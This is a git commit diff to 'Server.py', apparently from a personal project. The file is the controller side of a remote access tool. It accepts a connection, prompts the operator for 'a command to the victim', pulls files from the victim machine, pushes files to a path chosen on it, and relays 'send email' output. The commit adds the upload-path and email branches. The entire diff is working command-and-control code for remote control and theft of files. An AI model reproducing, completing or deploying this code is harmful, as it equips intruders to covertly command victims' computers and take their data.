e2ec74038f8614683f3ad9b88fc7933d5e9af916
yehonatan1 <54950358+yehonatan1@users.noreply.github.com>
2020-02-18 08:19:39 -0800

    Update Server.py

--- Server.py
+++ Server.py
@@ -6,19 +6,19 @@ def server():
     s.bind(('127.0.0.1', 9984))
 
     s.listen(1)
-    client_socket, adress = s.accept()
+    server_socket, adress = s.accept()
     print("Connection from: " + str(adress))
 
     while True:
         command = input('Please enter a command to the victim\n')
-        client_socket.send(command.encode('utf-8'))
+        server_socket.send(command.encode('utf-8'))
         if 'get file ' in command:
             data = None
             file_path = input("Please enter the path of the file\n")
             with open(file_path, 'wb')as f:
                 print('Open File')
                 while True:
-                    data = client_socket.recv(1024)
+                    data = server_socket.recv(1024)
                     if not data or len(data) < 1024:
                         f.write(data)
                         f.flush()
@@ -27,24 +27,25 @@ def server():
                     f.write(data)
         elif 'download file ' in command:
             command = command.replace('download file ', '')
-            print('hey')
+            victim_path = input('Where do you want to save the file\n')
+            server_socket.sendall(victim_path.encode('utf-8'))
             f = open(command, 'rb')
             while True:
                 content = f.read(1024)
                 if content:
-                    client_socket.sendall(content)
+                    server_socket.sendall(content)
                 else:
                     f.close()
                     break
-
-
-
-
-        else:
-            data = client_socket.recv(1024).decode('utf-8')
+        elif 'send email ' in command:
+            data = server_socket.recv(1024).decode('utf-8')
             print(data)
 
-    client_socket.close()
+        else:
+            data = server_socket.recv(1024).decode('utf-8')
+            print(data)
+
+    server_socket.close()
 
 
 if __name__ == '__main__':
